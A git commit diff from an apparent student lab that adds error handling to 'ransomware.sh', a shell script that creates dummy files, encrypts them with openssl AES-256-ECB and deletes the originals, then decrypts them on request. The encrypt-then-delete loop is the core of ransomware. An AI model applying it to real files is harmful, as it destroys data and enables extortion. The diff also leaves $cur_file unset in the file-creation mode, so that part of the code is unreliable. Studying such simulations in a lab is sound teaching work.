b163dfcd278c2d8d092b15b55883ce81f5eb362b
TheApo98 <73966912+TheApo98@users.noreply.github.com>
2021-12-12 19:56:51 +0200

    Implemented error handling

--- lab5/src_corpus/ransomware.sh
+++ lab5/src_corpus/ransomware.sh
@@ -40,6 +40,13 @@ done
 # echo $directory
 # echo $no_of_files
 
+# Check if directory path is valid
+if [ ! -d $directory ] 
+then
+    echo "No such file or directory"
+    exit -1
+fi
+
 # Navigate in the given directory
 cd $directory
 
@@ -47,24 +54,36 @@ case "${mode}" in
     0)
         # Create a number of files
         for ((i = 0; i < $no_of_files; i++)); do
-            touch file_$i.txt
-            echo "file_$i" > file_$i.txt
+            touch $cur_file
+            echo "file_$i" > $cur_file
         done
         ;;
     1)
         for ((i = 0; i < $no_of_files; i++)); do
-            # Encrypt the files
-            openssl enc -aes-256-ecb -in file_$i.txt -out file_$i.txt.encrypt -k $password &> /dev/null
-            # Delete the original files
-            rm file_$i.txt
+            cur_file="file_$i.txt"
+            if [ ! -w $cur_file ] 
+            then
+                echo "File '$cur_file' doesn't exist or is read-only"
+            else
+                # Encrypt the files
+                openssl enc -aes-256-ecb -in $cur_file -out $cur_file.encrypt -k $password &> /dev/null
+                # Delete the original files
+                rm $cur_file
+            fi
         done
         ;;
     2)
         for ((i = 0; i < $no_of_files; i++)); do
-            # Decrypt the files
-            openssl aes-256-ecb -in file_$i.txt.encrypt -out file_$i.txt -d -k $password &> /dev/null
-            # Delete the encypted files
-            rm file_$i.txt.encrypt
+            cur_file="file_$i.txt"
+            if [ ! -w $cur_file.encrypt ] 
+            then
+                echo "File '$cur_file.encrypt' doesn't exist or is read-only"
+            else
+                # Decrypt the files
+                openssl aes-256-ecb -in $cur_file.encrypt -out $cur_file -d -k $password &> /dev/null
+                # Delete the encypted files
+                rm $cur_file.encrypt
+            fi
         done        
         ;;
     *)
